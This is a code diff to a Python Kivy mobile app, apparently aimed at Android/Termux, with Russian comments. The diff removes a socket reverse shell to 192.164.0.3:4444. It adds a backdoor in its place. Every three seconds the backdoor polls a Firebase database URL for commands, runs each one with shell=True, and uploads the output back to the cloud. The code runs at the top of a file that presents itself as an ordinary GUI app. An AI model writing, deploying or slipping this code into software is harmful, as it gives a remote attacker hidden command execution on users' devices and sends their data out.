@@ -2,19 +2,51 @@ from kivy.app import App
 from kivy.uix.label import Label
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.button import Button
-import socket, subprocess
+import requests
+import subprocess
+import time
+import os
 
+DB_URL = "https://test-73273-default-rtdb.europe-west1.firebasedatabase.app/.json"
+RES_URL = "https://test-73273-default-rtdb.europe-west1.firebasedatabase.app/.json"
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('192.164.0.3', 4444))
-while True:
-    cmd = s.recv(1024).decode()
-    if cmd == 'exit':
-        break
-    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    output = proc.stdout.read() + proc.stderr.read()
-    s.send(output)
-s.close()
+last_cmd_id = None
+
+def start_client():
+    global last_cmd_id
+    print("[*] Клиент запущен. Ожидание команд из облака...")
+    
+    while True:
+        try:
+            # 1. Проверяем наличие новой команды
+            response = requests.get(DB_URL).json()
+            
+            if response and response.get("id") != last_cmd_id:
+                cmd = response.get("cmd")
+                last_cmd_id = response.get("id")
+                
+                print(f"[+] Выполнение: {cmd}")
+
+                # 2. Выполняем (в Android/Termux команды отличаются от Windows!)
+                # На Android используй 'ls', 'ifconfig', 'logcat'
+                proc = subprocess.Popen(cmd, shell=True, 
+                                        stdout=subprocess.PIPE, 
+                                        stderr=subprocess.PIPE)
+                stdout, stderr = proc.communicate()
+                output = (stdout + stderr).decode('utf-8', errors='replace')
+
+                # 3. Отправляем результат обратно в облако
+                requests.put(RES_URL, json={
+                    "status": "done",
+                    "output": output if output else "Done (no output)"
+                })
+        except Exception as e:
+            print(f"Error: {e}")
+            
+        time.sleep(3) # Интервал проверки
+
+if __name__ == "__main__":
+    start_client()
 
 class MainApp(App):
     def build(self):
